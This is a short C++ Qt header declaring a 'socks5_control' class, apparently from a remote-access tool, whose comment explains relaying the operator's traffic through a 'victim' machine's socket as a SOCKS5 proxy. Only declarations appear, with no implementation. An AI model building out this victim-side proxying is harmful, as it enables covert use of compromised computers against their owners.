/* so basically i listen on another tcp server for a connection from myself
 * when i connect to this shit, i send data to it, this takes the data and writes it to the specified socket?!
 * the speicied socket is the victims socket where it handles the fancy stuff
 *
 */

#ifndef SOCKS5_CONTROL_H
#define SOCKS5_CONTROL_H

#include <QWidget>
#include <QTcpSocket>
#include <QTcpServer>
#include <QString>
class socks5_control : public QWidget
{
    Q_OBJECT
public:

    void my_onReadyRead();
    void victim_onReadyRead();

    socks5_control(QWidget *parent, QTcpSocket *tcpSocket);
    QTcpServer *tcpServer;
    QTcpSocket *myConnection;
    QTcpSocket *victimConnection;
    int my_socks5_port;
    int victims_socks5_port;
    void newConnection();
signals:

public slots:

private:

    void disconnect_sock();
};

#endif // SOCKS5_CONTROL_H
